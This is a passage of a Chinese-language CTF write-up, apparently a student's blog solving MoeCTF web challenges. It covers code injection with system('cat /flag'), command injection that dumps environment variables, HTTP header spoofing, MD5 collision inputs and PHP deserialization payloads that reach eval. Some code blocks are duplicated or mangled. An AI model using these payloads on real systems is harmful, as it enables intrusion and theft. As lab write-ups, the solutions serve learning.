mnt proc root run sbin srv sys tmp usr var system(‘ls ..&#x2F;..&#x2F;..&#x2F;..&#x2F;‘);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://目标地址/next.php&amp;\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);   //       cat /flag 表示读取根目录下的flag文件。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(url).../next.php&amp;\S*=&#123;<span class="variable">$&#123;getFlag()&#125;</span>&#125;&amp;cmd=system(<span class="string">&#x27;linux命令&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Moe-web-笑传之猜猜爆"><a href="#Moe-web-笑传之猜猜爆" class="headerlink" title="Moe web 笑传之猜猜爆"></a>Moe web 笑传之猜猜爆</h2><p>源代码中：<script src="/static/main.js"></script> </p><!DOCTYPE html><html>  <head>    <meta charset="utf-8">    <title>猜数字游戏</title>    <link rel="stylesheet" href="/static/style.css">  </head>  <body>    <h1>猜数字游戏</h1>    <p>我刚才随机选定了一个10000以内的自然数。你有多达 <b>1</b> 次的机会猜中它！我会告诉你猜的高了还是低了...（这好像没有用？对吗？哈哈哈哈）</p>    <div class="form">      <label for="guessField">请猜数：</label>      <input type="number" id="guessField" class="guessField" min="1" max="10000">      <button id="guessBtn">我猜</button>    </div>    <div class="resultParas">      <p class="guesses"></p>      <p class="lastResult"></p>      <p class="lowOrHi"></p>      <p class="flagResult"></p>    </div>    <script src="/static/main.js"></script>  </body></html><p>1.进入&#x2F;static&#x2F;main.js</p><p>看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if(userGuess === randomNumber) &#123;</span><br><span class="line">   lastResult.textContent = &#x27;恭喜你！猜对了！&#x27;;</span><br><span class="line">   lastResult.style.backgroundColor = &#x27;green&#x27;;</span><br><span class="line">   lowOrHi.textContent = &#x27;&#x27;;</span><br><span class="line">   guessField.disabled = true;</span><br><span class="line">   guessBtn.disabled = true;</span><br><span class="line">   // 猜对后请求flag</span><br><span class="line">   fetch(&#x27; if(userGuess === randomNumber) &#123;</span><br><span class="line">   lastResult.textContent = &#x27;恭喜你！猜对了！&#x27;;</span><br><span class="line">   lastResult.style.backgroundColor = &#x27;green&#x27;;</span><br><span class="line">   lowOrHi.textContent = &#x27;&#x27;;</span><br><span class="line">   guessField.disabled = true;</span><br><span class="line">   guessBtn.disabled = true;</span><br><span class="line">   // 猜对后请求flag</span><br><span class="line">   fetch(&#x27;/flag&#x27;, &#123;method: &#x27;POST&#x27;&#125;)</span><br><span class="line">     .then(res =&gt; res.json())</span><br><span class="line">     .then(data =&gt; &#123;</span><br><span class="line">       document.querySelector(&#x27;.flagResult&#x27;).textContent = &quot;FLAG: &quot; + data.flag;</span><br><span class="line">     &#125;);</span><br><span class="line">   setGameOver();&#x27;, &#123;method: &#x27;POST&#x27;&#125;)</span><br><span class="line">     .then(res =&gt; res.json())</span><br><span class="line">     .then(data =&gt; &#123;</span><br><span class="line">       document.querySelector(&#x27;.flagResult&#x27;).textContent = &quot;FLAG: &quot; + data.flag;</span><br><span class="line">     &#125;);</span><br><span class="line">   setGameOver();</span><br></pre></td></tr></table></figure><p>得知：POST直接去&#x2F;flag,得到flag</p><h2 id="moectf-web-01-第一章-神秘的手镯-revenge"><a href="#moectf-web-01-第一章-神秘的手镯-revenge" class="headerlink" title="moectf web 01 第一章 神秘的手镯_revenge"></a>moectf web 01 第一章 神秘的手镯_revenge</h2><p>&#96;&#96;</p><p>K皇：咳咳…其实当年飞升后，为了防止你偷偷看我收藏的小秘密，我重新设置了一个密码放在wanyanzhou.txt里面了……但是我忘记密码是啥了，而且不小心把保存密码的文件删了……</p><p>HDdss：这…应该有备份吧？</p><p>K皇：确实有，不过当时着急忘记了…输入太多错误密码，手镯直接锁死了，要连续输入500遍正确密码才能打开。</p><p>&#96;&#96;</p><p>源代码：</p><table><thead><tr><th><div class="challenge"></th></tr></thead><tbody><tr><td><p class="hint">「以万言咒启封，禁取巧之道」</p></td></tr><tr><td><div class="input-area"></td></tr><tr><td>&lt;textarea id&#x3D;”passwordInput”                    &#x2F;&#x2F;这里有id&#x3D;”passwordInput”</td></tr><tr><td>placeholder&#x3D;”在此结印输入万言启封咒…”&gt;在此输入万言启封咒</textarea></td></tr><tr><td><div class="warning">粘贴禁止！请手动输入！</div></td></tr><tr><td></div></td></tr><tr><td><button id="unsealButton">启封手镯</button>                                            &#x2F;&#x2F;这里有个button id&#x3D;”unsealButton”</td></tr><tr><td></td></tr><tr><td><!-- 验证结果区域 --></td></tr><tr><td><div id="result"></div></td></tr><tr><td></div></td></tr><tr><td></td></tr></tbody></table><p>1.访问 wanyanzhou.txt.bak，下载打开，得到密码</p><p>2.发现不能复制粘贴，就去控制台执行脚本</p><p>（难怪为什么老是执行不了，这设置了 debugger 设置断点来阻止自动化脚本，可以关闭）</p><p>知识点：</p><p>​1.<code>setInterval(函数, 时间)</code>： <strong>“每隔 X 毫秒重复执行这个函数里的代码”</strong>，比如 <code>setInterval(function(){alert(&#39;hi&#39;)}, 1000)</code> 就是每隔 1 秒弹一次 “hi”。</p><p>​2.自动执行函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 里面的代码</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    // 1. 把文本内容定义好（就是你要输入的密码）</span><br><span class="line">    var text = &quot;你要输入的密码&quot;;</span><br><span class="line">    var count = 500; // 要点击的次数</span><br><span class="line">    var i = 0;</span><br><span class="line"></span><br><span class="line">    // 2. 定时重复执行：每次点击前重新填内容+点击</span><br><span class="line">    var interval = setInterval(function() &#123;</span><br><span class="line">        // 每次都重新获取元素（避免页面加载问题）</span><br><span class="line">        var input = document.getElementById(&quot;passwordInput&quot;);  //寻找页面里叫做passwordInput的东西，把他保存在input里面</span><br><span class="line">        var button = document.getElementById(&quot;unsealButton&quot;);</span><br><span class="line">        </span><br><span class="line">        if (i &gt;= count) &#123; // 达到次数就停止</span><br><span class="line">            clearInterval(interval);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if (input &amp;&amp; button) &#123; // 这俩元素都在吗，在的话值为1，运行</span><br><span class="line">            input.value = text; // 先填内容（抵消“点击清空”的坑）</span><br><span class="line">            button.click(); // 再点击按钮</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        i++;</span><br><span class="line">    &#125;, 10); // 每10毫秒执行一次（快速重复）</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="moectf-web-04-第四章-金曦破禁与七绝傀儡阵-题解"><a href="#moectf-web-04-第四章-金曦破禁与七绝傀儡阵-题解" class="headerlink" title="moectf web 04 第四章 金曦破禁与七绝傀儡阵 题解"></a>moectf web 04 第四章 金曦破禁与七绝傀儡阵 题解</h2><p>1.get传参</p><p><code>url+stone_golem?key=xdsec</code></p><p>这里有个疑问为什么不是<code>/?key=xdsec</code></p><p>是因为这里的stone_golem是个文件不是个目录</p><p>​后端文件路径：<code>/var/www/html/stone_golem.php</code> → 访问 <code>stone_golem?key=xdsec</code>（省略<code>.php</code>）；</p><p>​后端目录路径：<code>/var/www/html/stone_golem/</code> → 访问 <code>stone_golem/?key=xdsec</code>（加<code>/</code>指向目录）。</p><p>获得玉简碎片: bW9lY3Rme0Mw</p><p>2.post传参</p><p>bp改post，传入参数</p><p>获得玉简碎片: bjZyNDd1MTQ3</p><p>3.本地访问</p><p>X-Forwarded-For:127.0.0.1</p><table><thead><tr><th>请求头字段（英文）</th><th>解释</th><th>举个例子</th></tr></thead><tbody><tr><td>Host</td><td>告诉服务器 “我要访问你哪个网站”（一台服务器可能有多个网站，靠这个区分）</td><td>比如访问百度，Host 就是<code>www.baidu.com</code></td></tr><tr><td>User-Agent</td><td>告诉服务器 “我用的啥设备 &#x2F; 浏览器”（比如你是用手机还是电脑，用 Chrome 还是 Edge）</td><td>比如<code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0</code>（代表 Windows 电脑 + Chrome 浏览器）</td></tr><tr><td>Referer</td><td>告诉服务器 “我是从哪个页面跳过来的”</td><td>从<code>www.baidu.com</code>点进知乎，Referer 就是<code>www.baidu.com</code></td></tr><tr><td>Cookie</td><td>服务器给你的 “身份小票”（存着你的登录状态、账号信息，下次访问直接带过去，服务器就知道你是谁了）</td><td>比如<code>user_id=123; token=abc123</code>（代表你是 123 号用户）</td></tr><tr><td>X-Forwarded-For</td><td>告诉服务器 “请求的真实来源 IP 是什么”</td><td>比如<code>192.168.1.100</code>（你的本地 IP）</td></tr><tr><td>Accept</td><td>告诉服务器 “我能接收啥格式的内容”（比如要网页还是图片）</td><td>比如<code>text/html,image/png</code>（要网页和图片）</td></tr><tr><td>Accept-Encoding</td><td>告诉服务器 “我能解压啥压缩格式”（节省传输流量）</td><td>比如<code>gzip, deflate</code>（支持这两种压缩）</td></tr><tr><td>Accept-Language</td><td>告诉服务器 “我能看懂啥语言”（比如要中文还是英文页面）</td><td>比如<code>zh-CN,zh;q=0.9</code>（优先中文）</td></tr></tbody></table><p>获得玉简碎片: MTBuNV95MHVy</p><p>4.修改浏览器</p><p>改成<code>user-agent：moe browser</code></p><p>获得玉简碎片: X2g3N1BfbDN2</p><p>5.需要以xt的身份认证user!</p><p>Cookie： use&#x3D;xt</p><p>获得玉简碎片: M2xfMTVfcjM0</p><p>6.你从哪里来</p><p>改成：<strong>Referer</strong>: <a href="http://panshi/entry">http://panshi/entry</a></p><p>获得玉简碎片: bGx5X2gxOWgh</p><p>7.put请求</p><p>使用PUT方法，请求体为”新生！”</p><p>用curl构造请求</p><p>获得玉简碎片: fQ&#x3D;&#x3D;</p><p>拼接：</p><p>bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ&#x3D;&#x3D;</p><p>解码：</p><p>moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}</p><h2 id="moectf-web-06-第六章-藏经禁制？玄机初探！"><a href="#moectf-web-06-第六章-藏经禁制？玄机初探！" class="headerlink" title="moectf web 06 第六章 藏经禁制？玄机初探！"></a>moectf web 06 第六章 藏经禁制？玄机初探！</h2><p>账号密码题目，万能密码破解</p><p>得flag</p><h2 id="moectf-web-07-第七章-灵蛛探穴与阴阳双生符"><a href="#moectf-web-07-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="moectf web 07 第七章 灵蛛探穴与阴阳双生符"></a>moectf web 07 第七章 灵蛛探穴与阴阳双生符</h2><p>1.<strong>robots.txt</strong>：</p><p>它就像网站给搜索引擎爬虫立的 “家规”</p><p>放在网站根目录下（比如<code>https://xxx.com/robots.txt</code>）</p><p>纯文本格式，写清楚 “哪些页面你能爬、哪些不能爬”。</p><p><code>robots.txt</code>具体页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *  # 对所有爬虫生效</span><br><span class="line">Disallow: /admin/  # 禁止爬/admin/后台页面</span><br><span class="line">Allow: /article/  # 允许爬/article/文章页面</span><br></pre></td></tr></table></figure><p>2.md5是啥</p><p>答：MD5 是一种<strong>哈希算法</strong>，能把任意长度的内容转换成固定 128 位（32 个字符）的哈希值（比如<code>123</code>的 MD5 是<code>202cb962ac59075b964b07152d234b70</code>）。正常情况下不同内容的 MD5 值不同，但存在<strong>MD5 碰撞</strong>—— 即两个不同的内容，MD5 值完全一样。</p><p>规定：MD5参数必须是字符串</p><p>3.<code>?? &quot;&quot;</code>：如果 URL 里传了<code>a</code>参数，<code>$a</code>就等于传的值；没传<code>a</code>参数的话，<code>$a</code>就等于空字符串（避免报错）。</p><h5 id="题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的-“协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。"><a href="#题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的-“协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。" class="headerlink" title="题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。"></a>题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎<strong>爬虫</strong>哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。</h5><p>1.去访问robots.txt</p><p>得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /flag.php</span><br></pre></td></tr></table></figure><p>2.访问：&#x2F;flag.php</p><p>得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$flag = getenv(&#x27;FLAG&#x27;);</span><br><span class="line"></span><br><span class="line">$a = $_GET[&quot;a&quot;] ?? &quot;&quot;;</span><br><span class="line">$b = $_GET[&quot;b&quot;] ?? &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if($a == $b)&#123;</span><br><span class="line">    die(&quot;error 1&quot;);//a和b数值要不一样</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(md5($a) != md5($b))&#123;//a和b哈希值要一样</span><br><span class="line">    die(&quot;error 2&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag</span><br></pre></td></tr></table></figure><p>所以我们就要传a，b上去，并给他们赋值，要求：a和b数值要不一样；a和b哈希值要一样</p><p>?a&#x3D;…&amp;b&#x3D;…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><ol><li>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</li><li>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</li></ol><h2 id="PHP-反序列化漏洞"><a href="#PHP-反序列化漏洞" class="headerlink" title="PHP 反序列化漏洞"></a><strong>PHP 反序列化漏洞</strong></h2><h2 id="moectf-web-09-第九章-星墟禁制·天机问路"><a href="#moectf-web-09-第九章-星墟禁制·天机问路" class="headerlink" title="moectf web 09 第九章 星墟禁制·天机问路"></a>moectf web 09 第九章 星墟禁制·天机问路</h2><p>题目：让你输入url</p><p>1.随便输一个，发现网址变成</p><p><a href="http://127.0.0.1:62792/?url=www.baidu.com">http://127.0.0.1:62792/?url=www.baidu.com</a></p><p>那么<code>;</code>直接闭合它，再后面加上指令</p><p>ls -l</p><p>发现没有任何信息，猜测再env里面</p><p>输入<code>1;env</code>,得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443</span><br><span class="line">PHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.43.0.1</span><br><span class="line">PWD=/app</span><br><span class="line">PHP_SHA256=475f991afd2d5b901fb410be407d929bc00c46285d3f439a02c59e8b6fe3589c</span><br><span class="line">FLAG=moectf&#123;bf86146f-bae834&#125;</span><br></pre></td></tr></table></figure><h2 id="17-第十七章-星骸迷阵·神念重构"><a href="#17-第十七章-星骸迷阵·神念重构" class="headerlink" title="17 第十七章 星骸迷阵·神念重构"></a>17 第十七章 星骸迷阵·神念重构</h2><p>诶哟，我真的要杀人了，鬼题目炒了几个答案都是错的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__); // 显示当前代码，方便看结构</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a; // 可控的属性，用来注入恶意代码</span><br><span class="line">    function __destruct() &#123; // 对象销毁时触发</span><br><span class="line">        eval($this-&gt;a); // 执行$a属性里的代码（核心执行点）</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;a&#x27;])) &#123; // 接收GET参数a</span><br><span class="line">    unserialize($_GET[&#x27;a&#x27;]); // 把参数a的字符串还原成对象</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代审：把命令行输给a就ok</p><p>但是输入：<a href="http://127.0.0.1:46309/?a=ls%20flag%E5%90%8E%E5%BE%97%E5%88%B0%E4%BA%86%EF%BC%9A">http://127.0.0.1:46309/?a=ls%20flag后得到了：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice**: unserialize(): Error at offset 0 of 7 bytes in **/app/index.php** on line **12**</span><br></pre></td></tr></table></figure><p>这个报错的核心意思是：<strong>你传给<code>unserialize()</code>的字符串（共 7 字节），从第 0 位（第一个字符）开始就不符合 PHP 序列化格式，反序列化函数根本没法解析</strong>。</p><p>对不起没看到这里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知识点1：</p><p><code>unserialize()</code>反序列化：（后端拿到a后反序列化，那么我们只要序列化就ok）</p><p>序列化格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:类名长度:&quot;类名&quot;:属性数量:&#123;s:属性名长度:&quot;属性名&quot;;s:指令长度:&quot;要执行的指令&quot;;&#125;</span><br></pre></td></tr></table></figure><p>很麻烦可以直接写脚本：</p><p>脚本1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 定义和题目完全一样的类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>; <span class="comment">// 属性名必须和题目一致</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建对象，给$a赋值为读flag的代码</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="comment">// 选哪种代码？看环境：</span></span><br><span class="line"><span class="comment">// - 想先验证链路：$obj-&gt;a = &quot;phpinfo();&quot;;（调出PHP信息面板）</span></span><br><span class="line"><span class="comment">// - 想直接读flag：$obj-&gt;a = &quot;system(&#x27;cat /flag&#x27;);&quot;;（执行系统命令读flag）</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>; <span class="comment">// ’\‘是为了转义，不然前面一个引号后面闭合他以为语句就结束了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>); <span class="comment">// 输出：O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>__destruct()方法</code></p><p>对象销毁时触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这行代码执行完后，$obj没有任何其他地方引用（没有赋值给其他变量、没有后续调用），PHP判定「这个对象没用了」；</span><br><span class="line">PHP准备销毁$obj，触发A类的__destruct()方法；</span><br><span class="line">__destruct()里的eval($this-&gt;a)执行，也就是执行system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>脚本2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a=&#x27;system(&quot;cat /flag&quot;);&#x27;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=new A;</span><br><span class="line">$c=serialize($b);</span><br><span class="line">echo $c;</span><br></pre></td></tr></table></figure><p>new：</p><p><code>new</code> 是 PHP 里「创建对象」的关键字 —— 没有 <code>new</code>，就造不出 <code>A</code> 类的实例对象</p><p>A是设计图纸，new A才是能用的实体物品</p><h5 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h5><p>1.代审发现我们需要 以序列化的格式 ，给a传参</p><p>2.构造序列化的<code>&#39;system(&quot;\cat /flag\&quot;);&#39;</code></p><p>​<code>system()</code>：PHP 的<strong>系统命令执行函数</strong></p><p>​PHP 本身不能直接执行<code>cat /flag</code>，必须通过<code>system()</code>这类函数 “桥接”—— 把系统命令作为参数传给<code>system()</code>，PHP 才会调用系统去执行这个命令。</p><p>​引号：PHP 里，所有要执行的代码 &#x2F; 文本，只要是 “字符串形式”，就必须用引号（单引号<code>&#39;</code>或双引号<code>&quot;</code>）包裹</p><p>3.拼接url</p><h2 id="18-第十八章-万卷诡阁·功法连环"><a href="#18-第十八章-万卷诡阁·功法连环" class="headerlink" title="18 第十八章 万卷诡阁·功法连环"></a>18 第十八章 万卷诡阁·功法连环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class PersonA &#123;</span><br><span class="line">  private $name;</span><br><span class="line">  function __wakeup() &#123;</span><br><span class="line">    $name=$this-&gt;name;</span><br><span class="line">    $name-&gt;work();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB &#123;</span><br><span class="line">  public $name;</span><br><span class="line">  function work()&#123;</span><br><span class="line">    $name=$this-&gt;name;</span><br><span class="line">    eval($name);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;])) &#123;</span><br><span class="line">  unserialize($_GET[&#x27;person&#x27;]);  //person只是参数名，接收方查看人的名字，不用管他；我一直认为这里要改成name，其实不用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="title function_ invoke__">work</span>();</span><br><span class="line">    